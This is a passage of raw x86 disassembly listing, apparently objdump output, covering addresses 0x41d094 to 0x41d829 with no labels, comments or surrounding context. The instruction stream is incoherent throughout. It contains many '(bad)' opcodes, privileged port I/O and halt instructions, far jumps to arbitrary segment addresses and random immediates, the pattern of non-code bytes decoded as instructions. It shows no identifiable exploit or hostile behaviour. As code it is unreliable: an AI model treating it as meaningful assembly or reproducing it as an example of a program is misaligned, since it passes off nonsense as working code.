  41d094:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d095:	fstp   DWORD PTR [eax+0x48]
  41d098:	or     dh,bl
  41d09a:	adc    esi,DWORD PTR [ebp-0x11]
  41d09d:	sub    DWORD PTR [edx-0x29e6d84f],eax
  41d0a3:	cdq    
  41d0a4:	call   0xc02fb8f1
  41d0a9:	add    BYTE PTR [esi+0x65],cl
  41d0ac:	mov    esi,0x9efe9e94
  41d0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0b4:	adc    DWORD PTR fs:[ecx],esi
  41d0b7:	test   al,0x2c
  41d0b9:	adc    esp,eax
  41d0bb:	or     ah,al
  41d0bd:	fwait
  41d0be:	xlat   BYTE PTR ds:[ebx]
  41d0bf:	aas    
  41d0c0:	stos   BYTE PTR es:[edi],al
  41d0c1:	out    dx,al
  41d0c2:	add    al,bl
  41d0c4:	call   0x4fbc:0xcea0d38f
  41d0cb:	dec    eax
  41d0cc:	sbb    DWORD PTR [edx+0x8],esi
  41d0cf:	jne    0x41d061
  41d0d1:	add    DWORD PTR [eax+0x59],esi
  41d0d4:	shr    BYTE PTR [edx-0x13adc5e6],1
  41d0da:	dec    ebp
  41d0db:	pop    ds
  41d0dc:	(bad)  
  41d0dd:	pop    ecx
  41d0de:	mov    cl,0x5e
  41d0e0:	dec    edx
  41d0e1:	mov    dh,0x72
  41d0e3:	push   cs
  41d0e4:	adc    eax,0x1d576e2d
  41d0e9:	pop    es
  41d0ea:	inc    edi
  41d0eb:	fs and eax,0x6bf5b03e
  41d0f1:	dec    eax
  41d0f2:	pop    esi
  41d0f3:	ins    DWORD PTR es:[edi],dx
  41d0f4:	cdq    
  41d0f5:	int    0xea
  41d0f7:	xor    DWORD PTR [ecx+0x4b],esp
  41d0fa:	mov    esp,0x7bbc6d6b
  41d0ff:	out    0x73,al
  41d101:	push   ebp
  41d102:	adc    al,0xeb
  41d104:	ror    DWORD PTR ds:0xc141e05d,cl
  41d10a:	inc    eax
  41d10b:	test   bh,0xb0
  41d10e:	xchg   DWORD PTR [edi+ebx*2-0x70],eax
  41d112:	mov    dh,0xbd
  41d114:	sub    al,0xd0
  41d116:	fadd   QWORD PTR [edx+0x78f863e6]
  41d11c:	test   al,0x3b
  41d11e:	push   ss
  41d11f:	xor    al,0x4e
  41d121:	inc    esi
  41d122:	mov    esp,0x76b80a
  41d127:	lods   al,BYTE PTR ds:[esi]
  41d128:	jne    0x41d1a7
  41d12a:	out    dx,al
  41d12b:	mov    ds:0xb8179f2,eax
  41d130:	or     BYTE PTR [esp+ebp*1-0x2a1846a6],ah
  41d137:	push   edi
  41d138:	cmp    BYTE PTR [ecx],dl
  41d13a:	mov    ebp,0xb04e042d
  41d13f:	xchg   ebp,eax
  41d140:	sbb    al,0xf6
  41d142:	cdq    
  41d143:	ja     0x41d1af
  41d145:	jno    0x41d0ca
  41d147:	stos   BYTE PTR es:[edi],al
  41d148:	leave  
  41d149:	mov    esp,0x5a6480e0
  41d14e:	mov    edi,es
  41d150:	out    dx,al
  41d151:	mov    ds:0x6f7f09dd,eax
  41d156:	out    dx,eax
  41d157:	cmp    ah,0xde
  41d15a:	add    esi,DWORD PTR ds:0x50ad8df6
  41d160:	fldlg2 
  41d162:	xor    al,0x67
  41d164:	lahf   
  41d165:	hlt    
  41d166:	repz ficom DWORD PTR [ecx]
  41d169:	mov    eax,ds:0xfc60299f
  41d16e:	dec    edi
  41d16f:	sub    eax,0x7f2ca899
  41d174:	pop    edx
  41d175:	nop
  41d176:	daa    
  41d177:	ret    
  41d178:	pop    eax
  41d179:	loopne 0x41d1b5
  41d17b:	in     eax,dx
  41d17c:	fisttp WORD PTR [edi+0x65]
  41d17f:	(bad)  
  41d180:	shl    BYTE PTR [ebx+0x1cfa65ea],0x88
  41d187:	in     al,0xd3
  41d189:	sbb    eax,0x2beef641
  41d18e:	test   DWORD PTR [edi-0x1],esp
  41d191:	shl    BYTE PTR [ebp+0x75],1
  41d194:	retf   0xc191
  41d197:	cmp    al,0x94
  41d199:	push   0x53c7b893
  41d19e:	dec    ecx
  41d19f:	jnp    0x41d1ec
  41d1a1:	jmp    0x5462:0x9b9a74de
  41d1a8:	xchg   ecx,eax
  41d1a9:	mov    ah,0xc8
  41d1ab:	mov    eax,ds:0xe47672cb
  41d1b0:	add    eax,0x756adfa8
  41d1b5:	aas    
  41d1b6:	adc    esp,DWORD PTR [edi+edx*1-0x7a]
  41d1ba:	cmp    dh,BYTE PTR [ebp-0x75]
  41d1bd:	repz ds and ecx,ecx
  41d1c1:	mov    ecx,DWORD PTR [ebp+esi*4-0x4b1384c0]
  41d1c8:	test   eax,0x5dfc4f43
  41d1cd:	jbe    0x41d15d
  41d1cf:	rcl    DWORD PTR [edi+0x7375b127],0x61
  41d1d6:	push   esp
  41d1d7:	ret    0xda38
  41d1da:	lahf   
  41d1db:	mov    ebp,DWORD PTR [esi]
  41d1dd:	sub    al,0xcd
  41d1df:	pop    esp
  41d1e0:	cmp    ebx,DWORD PTR [ebx+0x5d]
  41d1e3:	rcl    ebp,0x6
  41d1e6:	into   
  41d1e7:	push   eax
  41d1e8:	scas   al,BYTE PTR es:[edi]
  41d1e9:	shl    DWORD PTR [ecx+0xd],1
  41d1ec:	mov    ebx,0xc37c2cb0
  41d1f1:	adc    bh,al
  41d1f3:	mov    bh,BYTE PTR [edi-0x788b8f62]
  41d1f9:	mov    dh,dh
  41d1fb:	jae    0x41d1e3
  41d1fd:	pop    ss
  41d1fe:	inc    esp
  41d1ff:	lea    eax,[esi-0x22]
  41d202:	and    BYTE PTR [ecx-0x5f],dh
  41d205:	mov    bh,0x60
  41d207:	pop    ecx
  41d208:	les    esi,FWORD PTR [ecx-0x6938437f]
  41d20e:	push   edx
  41d20f:	xor    cl,BYTE PTR [ebp-0x16]
  41d212:	sbb    ecx,DWORD PTR [eax]
  41d214:	xchg   edx,eax
  41d215:	mov    eax,0xbcc56a6
  41d21a:	lods   al,BYTE PTR ds:[esi]
  41d21b:	stos   DWORD PTR es:[edi],eax
  41d21c:	scas   al,BYTE PTR es:[edi]
  41d21d:	inc    edi
  41d21e:	std    
  41d21f:	adc    al,0xf7
  41d221:	add    esi,edi
  41d223:	mov    ah,0x8d
  41d225:	sub    eax,0xcec414c3
  41d22a:	aaa    
  41d22b:	mov    ebx,0xc100f02a
  41d230:	adc    ch,BYTE PTR [ebx+ebx*4]
  41d233:	jle    0x41d210
  41d235:	loop   0x41d255
  41d237:	stos   BYTE PTR es:[edi],al
  41d238:	mov    eax,0x504e6567
  41d23d:	inc    ebp
  41d23e:	ret    0x6e9a
  41d241:	stos   BYTE PTR es:[edi],al
  41d242:	sbb    al,0x69
  41d244:	mov    dl,BYTE PTR [eax]
  41d246:	pop    ds
  41d247:	push   esi
  41d248:	add    dh,bh
  41d24a:	bound  esp,QWORD PTR [ebx+0x669d0c72]
  41d250:	repz jb 0x41d2a5
  41d253:	xchg   esi,eax
  41d254:	push   eax
  41d255:	jns    0x41d1ec
  41d257:	jnp    0x41d2aa
  41d259:	in     eax,0x1f
  41d25b:	inc    ecx
  41d25c:	pop    eax
  41d25d:	inc    eax
  41d25e:	loop   0x41d1ef
  41d260:	dec    eax
  41d261:	or     eax,0xc537bda9
  41d266:	stc    
  41d267:	push   0xeb65f509
  41d26c:	int3   
  41d26d:	jmp    0x41d29d
  41d26f:	dec    esp
  41d270:	push   ebx
  41d271:	pop    es
  41d272:	lods   al,BYTE PTR ds:[esi]
  41d273:	mov    eax,0xf24d1379
  41d278:	mov    cl,0x7c
  41d27a:	sbb    ebx,esi
  41d27c:	test   BYTE PTR [edx-0x55],0x96
  41d280:	das    
  41d281:	or     eax,0x3feb38f8
  41d286:	mov    esp,0x5548317e
  41d28b:	pushf  
  41d28c:	shl    bl,0xa
  41d28f:	lods   eax,DWORD PTR ds:[esi]
  41d290:	fidiv  DWORD PTR cs:[esi-0x23391959]
  41d297:	cmp    dh,BYTE PTR [edx+0x3f]
  41d29a:	push   0xffffffc1
  41d29c:	sub    ebx,DWORD PTR [edi]
  41d29e:	sbb    al,BYTE PTR ds:0x50405672
  41d2a4:	push   es
  41d2a5:	mov    ebp,edx
  41d2a7:	aas    
  41d2a8:	fnsave [eax-0x48994e51]
  41d2ae:	aam    0xde
  41d2b0:	fs sahf 
  41d2b2:	cmp    eax,0x6c15ef78
  41d2b7:	inc    edi
  41d2b8:	lods   eax,DWORD PTR ds:[esi]
  41d2b9:	add    BYTE PTR [ebp-0x7eb3fad1],dh
  41d2bf:	mov    al,ds:0x139abf30
  41d2c4:	xchg   esi,eax
  41d2c5:	push   0xb13da685
  41d2ca:	mov    ebx,0x586403f
  41d2cf:	cmp    al,0x46
  41d2d1:	pop    eax
  41d2d2:	aas    
  41d2d3:	pop    edi
  41d2d4:	stos   DWORD PTR es:[edi],eax
  41d2d5:	call   0xb018:0xa623e45
  41d2dc:	cmp    DWORD PTR [ebx+0x73],ebp
  41d2df:	aas    
  41d2e0:	rcl    edi,cl
  41d2e2:	test   al,0xe3
  41d2e4:	fnstenv [ecx+0xc]
  41d2e7:	call   0x27f28f30
  41d2ec:	cwde   
  41d2ed:	inc    eax
  41d2ee:	pop    ecx
  41d2ef:	jmp    0xb6ed:0xfb9f9038
  41d2f6:	out    dx,al
  41d2f7:	push   ecx
  41d2f8:	lock and eax,0x50bd7794
  41d2fe:	sbb    bl,BYTE PTR [esi]
  41d300:	add    eax,0x8ef2e4ea
  41d305:	adc    al,0xbc
  41d307:	xor    esi,DWORD PTR [di+0x6]
  41d30b:	data16 fimul DWORD PTR [ecx+0x3e05aa90]
  41d312:	mov    WORD PTR fs:[ebx],cs
  41d315:	sbb    al,0x6b
  41d317:	pushf  
  41d318:	stc    
  41d319:	jg     0x41d33c
  41d31b:	mov    ds:0x52dbe013,eax
  41d320:	push   esp
  41d321:	psrlq  mm3,QWORD PTR [esi-0x764c509c]
  41d328:	mov    eax,ds:0x54be1c1b
  41d32d:	data16 test BYTE PTR ds:0x652aa26a,0x3
  41d335:	jl     0x41d2f5
  41d337:	lds    edx,FWORD PTR [esi-0x75]
  41d33a:	out    0x2b,al
  41d33c:	dec    ah
  41d33e:	pop    es
  41d33f:	xchg   esp,eax
  41d340:	and    ah,BYTE PTR [eax]
  41d342:	sbb    BYTE PTR [ecx-0xde61466],al
  41d348:	mov    eax,ds:0x73b619d4
  41d34d:	or     ecx,DWORD PTR [ebx+0xe]
  41d350:	jo     0x41d2d2
  41d352:	mov    ecx,ecx
  41d354:	in     al,0xf1
  41d356:	ror    cl,1
  41d358:	mov    ecx,0xc3fdf7d7
  41d35d:	or     BYTE PTR [eax+0x122128c4],ch
  41d363:	imul   esp,DWORD PTR [ebp-0x6d],0xfffdf852
  41d36a:	push   cs
  41d36b:	fistp  DWORD PTR [eax]
  41d36d:	cdq    
  41d36e:	cmp    DWORD PTR [ecx-0xa9e975],esi
  41d374:	mov    ecx,0x54565d27
  41d379:	sub    eax,0xe17a807a
  41d37e:	jb     0x41d3f5
  41d380:	adc    al,0x66
  41d382:	(bad)  
  41d383:	hlt    
  41d384:	mov    eax,ds:0x8e5bab8a
  41d389:	jb     0x41d3e7
  41d38b:	int    0xb3
  41d38d:	adc    cl,BYTE PTR [esi+0x58]
  41d390:	push   0x6582bf2e
  41d395:	mov    edi,0x9d121f7
  41d39a:	push   ecx
  41d39b:	inc    ecx
  41d39c:	xchg   edx,eax
  41d39d:	aad    0x52
  41d39f:	clc    
  41d3a0:	jbe    0x41d395
  41d3a2:	(bad)  
  41d3a4:	fs js  0x41d3c8
  41d3a7:	outs   dx,DWORD PTR ds:[esi]
  41d3a8:	push   edx
  41d3a9:	sub    cl,BYTE PTR [edi]
  41d3ab:	and    cl,bl
  41d3ad:	jae    0x41d409
  41d3af:	in     al,0xf3
  41d3b1:	mov    ch,0xf4
  41d3b3:	and    al,0x7
  41d3b5:	jmp    0xca56ff17
  41d3ba:	and    edi,DWORD PTR [edi+0x7c418ae8]
  41d3c0:	lods   eax,DWORD PTR es:[esi]
  41d3c2:	icebp  
  41d3c3:	pop    esp
  41d3c4:	mov    DWORD PTR [eax],ecx
  41d3c6:	js     0x41d3d4
  41d3c8:	push   esi
  41d3c9:	inc    edi
  41d3ca:	cmc    
  41d3cb:	(bad)  
  41d3cc:	xchg   ebp,eax
  41d3cd:	adc    edx,DWORD PTR [eax+0x41]
  41d3d0:	test   DWORD PTR [edx+0x1afc3649],ecx
  41d3d6:	push   es
  41d3d7:	test   DWORD PTR [eax],0x54a3bfd7
  41d3dd:	(bad)  
  41d3de:	cmp    eax,0xa03faaa7
  41d3e3:	lock popa 
  41d3e5:	cmp    al,0xf3
  41d3e7:	and    esp,ebx
  41d3e9:	jl     0x41d3fe
  41d3eb:	xlat   BYTE PTR ds:[ebx]
  41d3ec:	inc    esp
  41d3ed:	inc    ebx
  41d3ee:	or     ecx,DWORD PTR fs:[edx]
  41d3f1:	mov    dh,0x35
  41d3f3:	or     eax,0xfb79fa93
  41d3f8:	aas    
  41d3f9:	jnp    0x41d3f6
  41d3fb:	call   0x8749322b
  41d400:	lods   al,BYTE PTR gs:[si]
  41d403:	es test BYTE PTR ds:[edx+0x10],bl
  41d408:	inc    esp
  41d409:	inc    edi
  41d40a:	(bad)  
  41d40b:	fs pop edx
  41d40d:	sbb    eax,esi
  41d40f:	jecxz  0x41d475
  41d411:	inc    ebp
  41d412:	je     0x41d3d4
  41d414:	fwait
  41d415:	or     al,0xa9
  41d417:	or     DWORD PTR [edi-0x42],ecx
  41d41a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d41b:	and    eax,0x57f4f860
  41d420:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d421:	xor    al,0x55
  41d423:	mov    cl,0x6c
  41d425:	lock dec esp
  41d427:	iret   
  41d428:	inc    edx
  41d429:	pop    ss
  41d42a:	(bad)  
  41d42b:	mov    edi,0x50417241
  41d430:	cmp    ebp,DWORD PTR [edx]
  41d432:	xor    DWORD PTR [esi-0x4c],ecx
  41d435:	dec    eax
  41d436:	aaa    
  41d437:	std    
  41d438:	add    DWORD PTR [ebx+0x7bc98641],eax
  41d43e:	fdiv   DWORD PTR [edx-0x62]
  41d441:	repz pop esi
  41d443:	pusha  
  41d444:	lds    ebx,FWORD PTR [ebp+0x22]
  41d447:	repz pop ss
  41d449:	movups xmm3,xmm0
  41d44c:	in     al,dx
  41d44d:	xchg   esi,eax
  41d44e:	(bad)  
  41d450:	sub    ecx,DWORD PTR [eax+0x1c7d5a51]
  41d456:	cmp    bh,BYTE PTR [edi]
  41d458:	mov    bh,0x83
  41d45a:	popa   
  41d45b:	das    
  41d45c:	and    eax,0xe8d0ab90
  41d461:	aad    0xaa
  41d463:	ret    0x5fb
  41d466:	(bad)  
  41d467:	repnz arpl ax,sp
  41d46a:	xor    edi,DWORD PTR [edi]
  41d46c:	sbb    esp,DWORD PTR [ebp+0x34]
  41d46f:	lahf   
  41d470:	pop    esi
  41d471:	or     ah,bh
  41d473:	rcr    DWORD PTR [edx+0x5cc3d248],cl
  41d479:	retf   
  41d47a:	in     eax,0xd2
  41d47c:	imul   esi,DWORD PTR [ebp-0x57683916],0x7b81c17f
  41d486:	inc    esi
  41d487:	xor    DWORD PTR [esi+0x2e1fbd53],esi
  41d48d:	cmp    eax,DWORD PTR [esi]
  41d48f:	inc    ebp
  41d490:	idiv   ebx
  41d492:	and    eax,DWORD PTR [ecx+0x6f2d9d53]
  41d498:	add    DWORD PTR [eax-0x369ecbbc],esp
  41d49e:	loop   0x41d47b
  41d4a0:	fiadd  DWORD PTR [ebx+0x8b0c309]
  41d4a6:	jmp    0x7cdf:0x352f80c7
  41d4ad:	lea    ebx,[eax+0x21]
  41d4b0:	xchg   edx,eax
  41d4b1:	sub    ebx,DWORD PTR [ebp+0x2d]
  41d4b4:	cwde   
  41d4b5:	sub    DWORD PTR [edx-0x58],0x4cb02385
  41d4bc:	aas    
  41d4bd:	push   edx
  41d4be:	sti    
  41d4bf:	xor    cl,cl
  41d4c1:	xchg   esi,eax
  41d4c2:	ret    0x3e5d
  41d4c5:	and    DWORD PTR [eax+0x74],0xbfdc016c
  41d4cc:	dec    eax
  41d4cd:	scas   eax,DWORD PTR es:[edi]
  41d4ce:	retf   0xbea4
  41d4d1:	ja     0x41d520
  41d4d3:	neg    dh
  41d4d5:	push   edx
  41d4d6:	(bad)  
  41d4d7:	or     eax,0xf053eefe
  41d4dc:	fndisi(8087 only) 
  41d4de:	nop
  41d4df:	jns    0x41d4c5
  41d4e1:	rcl    DWORD PTR [ecx-0x114e2acb],cl
  41d4e7:	dec    ebp
  41d4e8:	mov    eax,ds:0xcde8a2bb
  41d4ed:	inc    ebp
  41d4ee:	mov    ds:0xcf603fe,al
  41d4f3:	(bad)
  41d4f7:	fs push 0xffffff9f
  41d4fa:	imul   ebp,eax,0xffffffb7
  41d4fd:	rol    DWORD PTR [edi+0x15d1dd17],0xb8
  41d504:	sub    cl,ah
  41d506:	jmp    0x41d52c
  41d508:	and    BYTE PTR [eax],0x2
  41d50b:	xor    al,0x3c
  41d50d:	dec    ebp
  41d50e:	inc    ebp
  41d50f:	imul   esp,DWORD PTR [ebx+0x82cd1d2],0x900c6d10
  41d519:	sbb    esi,DWORD PTR [eax+eax*4+0x66f781e5]
  41d520:	xchg   ebx,eax
  41d521:	dec    ebp
  41d522:	inc    edi
  41d523:	xlat   BYTE PTR ds:[ebx]
  41d524:	or     BYTE PTR [ebx-0x48],ah
  41d527:	inc    edx
  41d528:	sub    ch,BYTE PTR [ebp-0x476604ac]
  41d52e:	repnz lock (bad) 
  41d531:	fldenv [ebx+0x56]
  41d534:	test   dh,dl
  41d536:	out    0xc2,al
  41d538:	mov    al,ds:0x8986efb5
  41d53d:	xlat   BYTE PTR ds:[ebx]
  41d53e:	xchg   ecx,eax
  41d53f:	inc    esp
  41d540:	aad    0x56
  41d542:	in     al,0xb9
  41d544:	mov    dl,0xa6
  41d546:	arpl   di,bx
  41d548:	(bad)  
  41d549:	lahf   
  41d54a:	mov    DWORD PTR [esi+0x14],edx
  41d54d:	dec    ebx
  41d54e:	dec    ebx
  41d54f:	adc    DWORD PTR [ebx],edi
  41d551:	xor    DWORD PTR [esi],0x24
  41d554:	popa   
  41d555:	mov    ecx,0x7479c7c9
  41d55a:	ret    
  41d55b:	mov    eax,ds:0x2227a53d
  41d560:	push   edi
  41d561:	popa   
  41d562:	nop
  41d563:	mov    ds:0x2ed4cc1,eax
  41d568:	mov    ds:0x629ac2a3,al
  41d56d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d56e:	mov    WORD PTR [edx-0x7b],fs
  41d571:	(bad)  
  41d572:	popf   
  41d573:	les    esi,FWORD PTR [esi+0x22]
  41d576:	inc    edx
  41d577:	aam    0xac
  41d579:	imul   esi,DWORD PTR [edx-0x791f0e35],0x7585da37
  41d583:	(bad)  
  41d584:	jae    0x41d5c5
  41d586:	jae    0x41d51f
  41d588:	in     eax,dx
  41d589:	in     eax,0x91
  41d58b:	xchg   edi,eax
  41d58c:	add    eax,0x85ff85e5
  41d591:	add    edx,DWORD PTR [ebp-0x365a1007]
  41d597:	shr    BYTE PTR [esi-0x1a],cl
  41d59a:	xor    al,0x34
  41d59c:	cmp    esi,DWORD PTR [ecx+edi*2-0x16ec0c0]
  41d5a3:	ffree  st(7)
  41d5a5:	push   esp
  41d5a6:	ficomp WORD PTR [ecx-0x4b1e88d2]
  41d5ac:	fiadd  WORD PTR [eax]
  41d5ae:	adc    al,BYTE PTR [eax]
  41d5b0:	mov    cs,edi
  41d5b2:	imul   ecx,DWORD PTR [edx-0x7c],0xffffff8d
  41d5b6:	cmp    edx,DWORD PTR [eax]
  41d5b8:	mov    ah,0xb3
  41d5ba:	dec    edx
  41d5bb:	push   ebx
  41d5bc:	popf   
  41d5bd:	outs   dx,DWORD PTR ds:[esi]
  41d5be:	xchg   ebp,eax
  41d5bf:	jle    0x41d5ce
  41d5c1:	xchg   ebx,eax
  41d5c2:	sbb    ah,BYTE PTR [esi-0x67]
  41d5c5:	int3   
  41d5c6:	adc    ecx,ebp
  41d5c8:	cdq    
  41d5c9:	je     0x41d5ac
  41d5cb:	imul   ebx,DWORD PTR [edi+ebp*4],0x40227a28
  41d5d2:	bound  eax,QWORD PTR [ebx+ecx*2]
  41d5d5:	mov    esp,DWORD PTR [edi+0x76]
  41d5d8:	daa    
  41d5d9:	adc    BYTE PTR [edx+ebp*4+0x762c88ab],dh
  41d5e0:	xor    eax,0xa4e09216
  41d5e5:	cs gs pop ds
  41d5e8:	sbb    eax,DWORD PTR [esi+ebp*1]
  41d5eb:	cmp    DWORD PTR [eax],ecx
  41d5ed:	(bad)  [edx+eax*8+0x5b]
  41d5f1:	pusha  
  41d5f2:	nop
  41d5f3:	mov    eax,0x6655a136
  41d5f8:	mov    dh,0x76
  41d5fa:	fwait
  41d5fb:	mov    bl,0x40
  41d5fe:	adc    BYTE PTR [edx+0x1d],0xbd
  41d602:	jl     0x41d5d6
  41d604:	aad    0x7e
  41d606:	sub    BYTE PTR ds:[ecx+0x77],dh
  41d60a:	pop    ss
  41d60b:	add    BYTE PTR [ecx-0x7b],0x3d
  41d60f:	sub    bh,ch
  41d611:	loopne 0x41d5c1
  41d613:	es sbb eax,0x2d753f33
  41d619:	push   ss
  41d61a:	sub    BYTE PTR [ecx],bl
  41d61c:	or     eax,0x8872acb2
  41d621:	cmp    dl,BYTE PTR [esi+edi*8]
  41d624:	ins    DWORD PTR es:[edi],dx
  41d625:	rcl    BYTE PTR [esi],1
  41d627:	das    
  41d628:	xor    al,0xe0
  41d62a:	cs hlt 
  41d62c:	call   0x3284:0x708d8237
  41d633:	les    ebp,FWORD PTR [esi+0x66]
  41d636:	lods   al,BYTE PTR ds:[esi]
  41d637:	inc    esp
  41d638:	pop    edi
  41d639:	xlat   BYTE PTR ds:[ebx]
  41d63a:	cs mov ah,0xba
  41d63d:	jle    0x41d693
  41d63f:	add    eax,DWORD PTR [esi]
  41d641:	out    0x96,eax
  41d643:	sbb    ch,BYTE PTR [eax-0xd]
  41d646:	shl    BYTE PTR [ebp+0x61068efb],0x66
  41d64d:	cmc    
  41d64e:	xor    ah,BYTE PTR ds:0x399dca14
  41d654:	mov    eax,ds:0x6a1b34a3
  41d659:	mov    eax,0x8cebe885
  41d65e:	out    dx,al
  41d65f:	pop    ecx
  41d660:	cmp    edi,esi
  41d662:	dec    ebp
  41d663:	mov    ah,0xd8
  41d665:	mov    bl,0x57
  41d667:	jle    0x41d619
  41d669:	call   0xb5d6:0x957ffacf
  41d670:	dec    ebp
  41d671:	pop    esi
  41d672:	inc    esp
  41d673:	cmp    al,0xfc
  41d675:	cmp    DWORD PTR [eax-0x3935449e],edi
  41d67b:	(bad)  
  41d67c:	mov    edx,0xc156db61
  41d681:	fs gs push 0x364208ed
  41d688:	test   DWORD PTR [edx+0x31411a62],ecx
  41d68e:	add    BYTE PTR [ecx+0x64],bl
  41d691:	es jecxz 0x41d6fd
  41d694:	jns    0x41d6cb
  41d696:	in     eax,dx
  41d697:	aas    
  41d698:	mov    esp,0x6f03095b
  41d69d:	in     al,0x4b
  41d69f:	popa   
  41d6a0:	lods   al,BYTE PTR fs:[esi]
  41d6a2:	adc    al,0x17
  41d6a4:	mov    cl,0x4d
  41d6a6:	(bad)  
  41d6a7:	pop    esp
  41d6a8:	or     DWORD PTR [ebx],0xb59519f1
  41d6ae:	outs   dx,BYTE PTR ds:[esi]
  41d6af:	popa   
  41d6b0:	sbb    BYTE PTR [edi-0xe3de459],al
  41d6b6:	jle    0x41d67f
  41d6b8:	out    0x81,eax
  41d6ba:	js     0x41d669
  41d6bc:	mov    al,0x4d
  41d6be:	add    DWORD PTR [edi+eax*4-0x325660a4],edx
  41d6c5:	add    al,0x91
  41d6c7:	lods   al,BYTE PTR ds:[esi]
  41d6c8:	mov    dl,0xd9
  41d6ca:	ret    
  41d6cb:	int3   
  41d6cc:	sbb    esi,esi
  41d6ce:	push   ds
  41d6cf:	fbld   TBYTE PTR [ebp+0x3810d44c]
  41d6d5:	mov    ecx,0x3afb76c1
  41d6da:	jns    0x41d66d
  41d6dc:	mov    edi,0x8d3c54fa
  41d6e1:	cmp    BYTE PTR gs:[ebx+0x39],0x23
  41d6e6:	pop    ecx
  41d6e7:	loope  0x41d70b
  41d6e9:	es sbb eax,0x5f23139a
  41d6ef:	xor    BYTE PTR [eax+0x5bd8af63],dl
  41d6f5:	jmp    0xe3ac:0x8f24099
  41d6fc:	push   es
  41d6fd:	xor    BYTE PTR [edx+0x117c772a],dh
  41d703:	mov    ebp,0x1a3c56f0
  41d708:	test   BYTE PTR fs:[ebx-0x70],al
  41d70c:	jbe    0x41d73e
  41d70e:	stos   BYTE PTR es:[edi],al
  41d70f:	fiadd  WORD PTR [ebp+0x1e169b6f]
  41d715:	mov    esp,0x4425fc94
  41d71a:	cmp    ebp,esp
  41d71c:	mov    ebp,0x900f4aa7
  41d721:	or     eax,0xdebaec18
  41d726:	jnp    0x41d6ab
  41d728:	mov    dl,0x9
  41d72a:	out    0x4a,al
  41d72c:	cdq    
  41d72d:	in     eax,0xce
  41d72f:	stos   BYTE PTR es:[edi],al
  41d730:	arpl   WORD PTR [ecx-0x6eb025aa],cx
  41d736:	pusha  
  41d737:	add    BYTE PTR [esi-0x5a],dl
  41d73a:	or     eax,0x8e059706
  41d73f:	pop    edx
  41d740:	pop    ebx
  41d741:	sub    esp,ecx
  41d743:	xor    esi,ebx
  41d745:	jmp    DWORD PTR [edi-0x51]
  41d748:	dec    ebx
  41d749:	pusha  
  41d74a:	ja     0x41d767
  41d74c:	lahf   
  41d74d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d74e:	fcom   QWORD PTR [edi-0x19d5ad2a]
  41d754:	lock ds in al,0xc0
  41d758:	inc    ebx
  41d759:	add    dl,cl
  41d75b:	in     eax,dx
  41d75c:	jne    0x41d730
  41d75e:	mov    edi,0x7bb9c186
  41d763:	aam    0x1e
  41d765:	pop    edi
  41d766:	jmp    0x661f:0x1d8d5786
  41d76d:	fcom   QWORD PTR [edi-0x741222b3]
  41d773:	sbb    BYTE PTR [edi-0x185dda47],0xc5
  41d77a:	cli    
  41d77b:	aam    0x3d
  41d77d:	sub    BYTE PTR [si],0xfe
  41d781:	xor    dl,0x79
  41d784:	retf   0x737a
  41d787:	adc    al,0xb9
  41d789:	sbb    al,0x98
  41d78b:	and    ch,BYTE PTR [edx]
  41d78d:	pop    ds
  41d78e:	inc    ebx
  41d78f:	dec    ebx
  41d790:	mov    gs,WORD PTR [eax+0x39]
  41d793:	xchg   edi,eax
  41d794:	xor    ecx,ebx
  41d796:	cmp    al,0x64
  41d798:	push   esp
  41d799:	mov    dl,BYTE PTR [edi]
  41d79b:	mov    bl,0x9a
  41d79d:	out    0x0,eax
  41d79f:	dec    ebx
  41d7a0:	aad    0x36
  41d7a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7a3:	ins    DWORD PTR es:[edi],dx
  41d7a4:	and    edi,edi
  41d7a6:	xlat   BYTE PTR ds:[ebx]
  41d7a7:	or     esi,DWORD PTR [ecx]
  41d7a9:	out    dx,eax
  41d7aa:	cmp    eax,0x631ddb26
  41d7af:	adc    esi,edx
  41d7b1:	ins    BYTE PTR es:[edi],dx
  41d7b2:	pop    ds
  41d7b3:	(bad)  
  41d7b4:	dec    ebp
  41d7b5:	jp     0x41d807
  41d7b7:	jo     0x41d78b
  41d7b9:	adc    dl,ch
  41d7bb:	aam    0x4d
  41d7bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7be:	inc    ebx
  41d7bf:	mov    bh,0x2c
  41d7c1:	jb     0x41d801
  41d7c3:	pop    edx
  41d7c4:	ins    BYTE PTR es:[edi],dx
  41d7c5:	cwde   
  41d7c6:	push   esp
  41d7c7:	je     0x41d845
  41d7c9:	cdq    
  41d7ca:	pop    esi
  41d7cb:	jns    0x41d7f8
  41d7cd:	or     bl,bh
  41d7cf:	sub    DWORD PTR [ecx+0x2f],ebx
  41d7d2:	mov    cs,WORD PTR [edi+0x38]
  41d7d5:	and    eax,0x6a02abf4
  41d7da:	inc    ebx
  41d7db:	(bad)  
  41d7dc:	lahf   
  41d7dd:	call   0x8982:0xdb285a9
  41d7e4:	test   DWORD PTR [ebx],esp
  41d7e6:	test   ebp,0x3a0c8bc
  41d7ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7ed:	sub    al,0x98
  41d7ef:	xchg   ecx,eax
  41d7f0:	arpl   WORD PTR [ebx],sp
  41d7f2:	mov    ds:0x8d4950da,al
  41d7f7:	cmp    DWORD PTR [ecx+0x13],0xf67866b7
  41d7fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7ff:	xchg   esp,eax
  41d800:	popf   
  41d801:	hlt    
  41d802:	cmp    DWORD PTR [ebx-0x3],0x8a88b5fe
  41d809:	fwait
  41d80a:	adc    esp,DWORD PTR [edx+0x3482db2f]
  41d810:	enter  0x1cb6,0x8
  41d814:	out    dx,al
  41d815:	inc    ecx
  41d816:	push   ecx
  41d817:	xor    DWORD PTR [edi],eax
  41d819:	adc    dh,BYTE PTR [edx-0x63]
  41d81c:	mov    bl,0xc3
  41d81e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d81f:	or     esp,DWORD PTR [eax-0x742db6be]
  41d825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d826:	mov    esi,ss
  41d828:	inc    ebp
  41d829:	daa    
